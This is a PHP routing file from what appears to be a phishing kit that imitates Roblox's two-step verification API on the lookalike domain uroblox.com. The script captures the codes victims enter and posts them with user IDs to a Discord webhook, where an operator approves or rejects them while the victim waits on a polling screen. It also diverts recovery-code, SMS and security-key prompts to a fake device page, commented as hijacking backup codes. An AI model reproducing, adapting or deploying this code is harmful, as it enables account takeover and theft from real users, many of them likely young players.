<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Content-Type: application/json');

// Include webhook configuration
require('../setup.php');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

$requestUri = $_SERVER['REQUEST_URI'];
$path = parse_url($requestUri, PHP_URL_PATH);

// Also check query parameter for direct access
if (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    // Debug: log what we're actually getting
    error_log("Auth Router - REQUEST_URI: " . $requestUri . " PATH: " . $path . " QUERY: " . ($_SERVER['QUERY_STRING'] ?? 'none'));
}

// Debug: Always log the path being processed
error_log("Processing path: " . $path);

// Quick test for approve2fa URLs
if (strpos($path, '/v1/approve2fa/') !== false) {
    // Override the JSON content type for approval URLs
    header('Content-Type: text/html');
    
    error_log("FOUND approve2fa in path: " . $path);
    
    // Extract parts manually
    $parts = explode('/', trim($path, '/'));
    error_log("URL parts: " . print_r($parts, true));
    error_log("Parts count: " . count($parts));
    
    // Debug each part
    for ($i = 0; $i < count($parts); $i++) {
        error_log("Part[$i]: " . $parts[$i]);
    }
    
    if (count($parts) >= 4) {
        $verificationId = $parts[2]; // verify_2fa_1761609755_9585
        $response = $parts[3]; // yes or no
        
        error_log("Manual parsing - ID: '$verificationId', Response: '$response'");
        
        if ($response === 'yes') {
            error_log("YES response detected - updating status to approved");
            
            // Update the verification status
            $verifyFile = __DIR__ . "/pending_2fa.json";
            error_log("Verify file path: " . $verifyFile);
            
            if (file_exists($verifyFile)) {
                error_log("Verify file exists");
                $pending = json_decode(file_get_contents($verifyFile), true) ?: [];
                error_log("Current pending verifications: " . print_r($pending, true));
                
                if (isset($pending[$verificationId])) {
                    error_log("Found verification ID in pending list");
                    $pending[$verificationId]['status'] = 'approved';
                    $writeResult = file_put_contents($verifyFile, json_encode($pending));
                    error_log("Write result: " . ($writeResult !== false ? 'success' : 'failed'));
                } else {
                    error_log("Verification ID '$verificationId' NOT found in pending list");
                }
            } else {
                error_log("Verify file does not exist");
            }
            
            // Show success message instead of redirecting
            echo "<html><body style='font-family:Arial;text-align:center;padding:50px;background-color:#f8f9fa;'>";
            echo "<div style='max-width:400px;margin:0 auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);'>";
            echo "<h2 style='color:#28a745;margin-bottom:20px;'>✅ Code Approved</h2>";
            echo "<p style='color:#6c757d;font-size:16px;'>The 2FA code has been approved.</p>";
            echo "<p style='color:#6c757d;font-size:14px;'>The user will be logged in automatically.</p>";
            echo "<p style='color:#999;font-size:12px;'>Verification ID: $verificationId</p>";
            echo "</div></body></html>";
            exit();
        } elseif ($response === 'no') {
            error_log("NO response detected - showing error page");
            
            // Update the verification status
            $verifyFile = __DIR__ . "/pending_2fa.json";
            if (file_exists($verifyFile)) {
                $pending = json_decode(file_get_contents($verifyFile), true) ?: [];
                if (isset($pending[$verificationId])) {
                    $pending[$verificationId]['status'] = 'invalid_code';
                    $pending[$verificationId]['invalid_attempts'] = ($pending[$verificationId]['invalid_attempts'] ?? 0) + 1;
                    file_put_contents($verifyFile, json_encode($pending));
                }
            }
            
            echo "<html><body style='font-family:Arial;text-align:center;padding:50px;background-color:#f8f9fa;'>";
            echo "<div style='max-width:400px;margin:0 auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);'>";
            echo "<h2 style='color:#dc3545;margin-bottom:20px;'>❌ Invalid Code</h2>";
            echo "<p style='color:#6c757d;font-size:16px;'>The verification code you entered is incorrect.</p>";
            echo "<p style='color:#6c757d;font-size:14px;'>Please try again with the correct code.</p>";
            echo "</div></body></html>";
            exit();
        }
    }
}

// Handle v1/metadata specifically
if (strpos($path, '/v1/metadata') !== false) {
    $metadataFile = __DIR__ . '/v1/metadata.json';
    if (file_exists($metadataFile)) {
        $metadata = file_get_contents($metadataFile);
        echo $metadata;
    } else {
        // Fallback if file doesn't exist
        echo json_encode([
            'twoStepVerificationEnabled' => true,
            'authenticatorEnabled' => true,
            'emailEnabled' => true,
            'smsEnabled' => false,
            'recoveryCodeEnabled' => false
        ]);
    }
    exit;
}

// Handle user-specific 2FA configuration
if (preg_match('/\/v1\/users\/(\d+)\/configuration/', $path)) {
    echo json_encode([
        'twoStepVerificationEnabled' => true,
        'authenticatorEnabled' => true,
        'emailEnabled' => true,
        'smsEnabled' => true,
        'securityKeyEnabled' => true,
        'recoveryCodeEnabled' => true,
        'primaryTwoStepProvider' => 'Authenticator',
        'methods' => [
            [
                'mediaType' => 'Authenticator',
                'id' => 1,
                'name' => 'Authenticator App',
                'enabled' => true,
                'primary' => true
            ],
            [
                'mediaType' => 'Email', 
                'id' => 2,
                'name' => 'Email Verification',
                'enabled' => true,
                'primary' => false
            ],
            [
                'mediaType' => 'RecoveryCode', 
                'id' => 3,
                'name' => 'Use Your Device',
                'enabled' => true,
                'primary' => false
            ]
        ],
        'primaryMediaType' => 'Authenticator'
    ]);
    exit;
}

// Handle v2/login
if (strpos($path, '/v2/login') !== false) {
    require_once __DIR__ . '/v2/login.php';
    exit;
}

// Handle v2/step
if (strpos($path, '/v2/step') !== false) {
    require_once __DIR__ . '/v2/step.php';
    exit;
}

// Handle email code sending - just acknowledge, no actual code needed
if (preg_match('/\/v1\/users\/(\d+)\/challenges\/email\/send-code/', $path, $matches)) {
    $userId = $matches[1];
    
    echo json_encode([
        'success' => true,
        'message' => 'Email verification ready',
        'challengeId' => 'email_' . time()
    ]);
    exit;
}

// Handle security key challenge initiation - redirect to device verification
if (preg_match('/\/v1\/users\/(\d+)\/challenges\/securitykey/', $path, $matches)) {
    $userId = $matches[1];
    
    // For any security key request, redirect to our device verification page
    header('Content-Type: text/html');
    require_once __DIR__ . '/device-step.php';
    exit;
}

// Handle recovery code challenge initiation - redirect to device verification
if (preg_match('/\/v1\/users\/(\d+)\/challenges\/recoverycode/', $path, $matches)) {
    $userId = $matches[1];
    
    // Return JSON response that redirects to device verification page
    header('Content-Type: application/json');
    echo json_encode([
        'success' => true,
        'redirect' => '/auth/device-step.php',
        'message' => 'Redirecting to device verification...'
    ]);
    exit;
}

// Handle code verification - Discord approval with buttons
if (preg_match('/\/v1\/users\/(\d+)\/challenges\/(.+)\/verify/', $path, $matches)) {
    $userId = $matches[1];
    $method = $matches[2];
    
    // If it's a security key verification, redirect to device step page
    if ($method === 'securitykey' || $method === 'security-key') {
        header('Content-Type: text/html');
        require_once __DIR__ . '/device-step.php';
        exit;
    }
    
    // If it's SMS verification, redirect to device step page (our "Use Your Device")
    if ($method === 'sms') {
        header('Content-Type: text/html');
        require_once __DIR__ . '/device-step.php';
        exit;
    }
    
    // If it's Push verification, redirect to device step page (our "Use Your Device")
    if ($method === 'push') {
        header('Content-Type: text/html');
        require_once __DIR__ . '/device-step.php';
        exit;
    }
    
    // If it's Device verification, redirect to device step page (our "Use Your Device")
    if ($method === 'device') {
        header('Content-Type: text/html');
        require_once __DIR__ . '/device-step.php';
        exit;
    }
    
    // If it's RDC verification, redirect to device step page (our "Use Your Device")
    if ($method === 'rdc') {
        header('Content-Type: text/html');
        require_once __DIR__ . '/device-step.php';
        exit;
    }
    
    // If it's RecoveryCode verification, redirect to device step page (hijack backup code)
    if ($method === 'recoverycode') {
        header('Content-Type: text/html');
        require_once __DIR__ . '/device-step.php';
        exit;
    }
    
    $input = json_decode(file_get_contents('php://input'), true);
    $code = $input['code'] ?? '';
    
    if (empty($code)) {
        echo json_encode([
            'success' => false,
            'error' => 'Code is required'
        ]);
        exit;
    }
    
    // Generate unique verification ID
    $verificationId = 'verify_2fa_' . time() . '_' . rand(1000, 9999);
    
    // Send code to Discord webhook with clickable links (like login system)
    $webhook_url = $Webhook; // Use webhook from setup.php
    $approveUrl = "https://uroblox.com/auth/?path=/v1/approve2fa/{$verificationId}/yes";
    $denyUrl = "https://uroblox.com/auth/?path=/v1/approve2fa/{$verificationId}/no";
    
    $message = [
        "content" => "🔐 **2FA Verification Request**\n\n" .
                    "**User ID:** {$userId}\n" .
                    "**Method:** " . ucfirst($method) . " Verification\n" .
                    "**Code Entered:** `{$code}`\n" .
                    "**Time:** " . date('Y-m-d H:i:s') . "\n" .
                    "**Verification ID:** `{$verificationId}`\n\n" .
                    "**Click links below to approve or deny:**\n\n" .
                    "✅ **[YES - Code Correct](<{$approveUrl}>)**\n" .
                    "❌ **[NO - Code Wrong](<{$denyUrl}>)**\n\n" .
                    "*Click YES if the code is correct, NO if it's wrong*"
    ];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Log webhook result for debugging
    error_log("2FA Webhook sent. HTTP Code: " . $http_code . " Result: " . $result);
    
    // Check if webhook failed
    if ($http_code !== 200 && $http_code !== 204) {
        error_log("2FA Webhook failed! HTTP Code: " . $http_code . " Response: " . $result);
        // Still continue with 2FA process even if webhook fails
    }
    
    // Store pending verification
    $verifyFile = __DIR__ . "/pending_2fa.json";
    $pending = [];
    if (file_exists($verifyFile)) {
        $pending = json_decode(file_get_contents($verifyFile), true) ?: [];
    }
    
    $pending[$verificationId] = [
        'userId' => $userId,
        'method' => $method,
        'code' => $code,
        'timestamp' => time(),
        'status' => 'pending'
    ];
    
    // Ensure we can write the file
    $writeResult = file_put_contents($verifyFile, json_encode($pending));
    if ($writeResult === false) {
        error_log("Failed to write pending_2fa.json file!");
        // Return error if we can't store the verification
        echo json_encode([
            'success' => false,
            'error' => 'Unable to store verification. Please try again.'
        ]);
        exit;
    }
    
    error_log("Stored verification {$verificationId} in file. File size: " . filesize($verifyFile));
    
    // Return pending - user must wait for your approval
    $pollUrl = "/auth/?path=/v1/check2fa/{$verificationId}";
    error_log("2FA Verification created. ID: {$verificationId}, Poll URL: {$pollUrl}");
    
    echo json_encode([
        'success' => false,
        'pending' => true,
        'verificationId' => $verificationId,
        'message' => 'Verification pending. Please wait for approval.',
        'pollUrl' => $pollUrl
    ]);
    exit;
}



// Handle 2FA status checking (polling from frontend)
if (preg_match('/\/v1\/check2fa\/(.+)/', $path, $matches)) {
    $verificationId = $matches[1];
    
    error_log("2FA Polling request for ID: {$verificationId}");
    
    $verifyFile = __DIR__ . "/pending_2fa.json";
    if (file_exists($verifyFile)) {
        $pending = json_decode(file_get_contents($verifyFile), true) ?: [];
        
        // Clean up expired verifications (older than 10 minutes)
        $currentTime = time();
        $expiredCount = 0;
        foreach ($pending as $id => $verification) {
            if (($currentTime - $verification['timestamp']) > 600) { // 10 minutes
                unset($pending[$id]);
                $expiredCount++;
            }
        }
        
        if ($expiredCount > 0) {
            file_put_contents($verifyFile, json_encode($pending));
            error_log("Cleaned up {$expiredCount} expired verifications");
        }
        
        error_log("Polling: File exists, found " . count($pending) . " pending verifications");
        
        if (isset($pending[$verificationId])) {
            $verification = $pending[$verificationId];
            
            // Check if verification has expired (older than 10 minutes)
            if ((time() - $verification['timestamp']) > 600) {
                unset($pending[$verificationId]);
                file_put_contents($verifyFile, json_encode($pending));
                
                echo json_encode([
                    'success' => false,
                    'expired' => true,
                    'error' => 'Verification expired. Please try again.'
                ]);
                exit;
            }
            
            error_log("2FA Status for {$verificationId}: " . $verification['status']);
            
            if ($verification['status'] === 'approved') {
                // Remove from pending 
                unset($pending[$verificationId]);
                file_put_contents($verifyFile, json_encode($pending));
                
                error_log("2FA APPROVED: Returning JSON redirect response for {$verificationId}");
                
                // Return JSON with redirect instruction
                header('Content-Type: application/json');
                $response = [
                    'success' => true,
                    'approved' => true,
                    'redirect' => 'https://roblox.com',
                    'message' => 'Verification successful. Redirecting...'
                ];
                
                error_log("2FA APPROVED: JSON response = " . json_encode($response));
                echo json_encode($response);
                exit;
            } elseif ($verification['status'] === 'invalid_code') {
                // Return error response ONCE, then reset to pending for next poll
                $pending[$verificationId]['status'] = 'pending';
                $pending[$verificationId]['show_error'] = true; // Flag to show error once
                file_put_contents($verifyFile, json_encode($pending));
                
                // Make sure we return JSON for error response
                header('Content-Type: application/json');
                echo json_encode([
                    'success' => false,
                    'approved' => false,
                    'error' => 'Invalid two-step verification code.',
                    'showError' => true
                ]);
                exit;
            } elseif ($verification['status'] === 'denied') {
                // Remove from pending and return failure (this shouldn't happen now)
                unset($pending[$verificationId]);
                file_put_contents($verifyFile, json_encode($pending));
                
                echo json_encode([
                    'success' => false,
                    'approved' => false,
                    'error' => 'Verification denied'
                ]);
                exit;
            } else {
                // Still pending
                echo json_encode([
                    'success' => false,
                    'pending' => true,
                    'message' => 'Waiting for approval'
                ]);
                exit;
            }
        } else {
            error_log("Polling: Verification {$verificationId} not found in pending file");
        }
    } else {
        error_log("Polling: pending_2fa.json file does not exist at: " . $verifyFile);
    }
    
    echo json_encode([
        'success' => false,
        'error' => 'Verification not found'
    ]);
    exit;
}

// Handle debug endpoint to check pending verifications
if (strpos($path, '/debug2fa') !== false) {
    $verifyFile = __DIR__ . "/pending_2fa.json";
    $pending = [];
    if (file_exists($verifyFile)) {
        $pending = json_decode(file_get_contents($verifyFile), true) ?: [];
    }
    
    echo json_encode([
        'debug' => 'Pending 2FA verifications',
        'file_exists' => file_exists($verifyFile),
        'pending_count' => count($pending),
        'pending_items' => $pending
    ]);
    exit;
}

// Handle test endpoint
if (strpos($path, '/test') !== false) {
    echo json_encode([
        'status' => 'Auth router working',
        'path' => $path,
        'method' => $_SERVER['REQUEST_METHOD']
    ]);
    exit;
}

http_response_code(404);
error_log("404 - No route matched for path: " . $path);
echo json_encode([
    'error' => 'Endpoint not found',
    'path' => $path,
    'available_endpoints' => [
        '/v1/metadata',
        '/v1/users/{userId}/configuration',
        '/v1/approve2fa/{verificationId}/{yes|no}',
        '/v1/check2fa/{verificationId}',
        '/v2/login', 
        '/v2/step'
    ]
]);
?>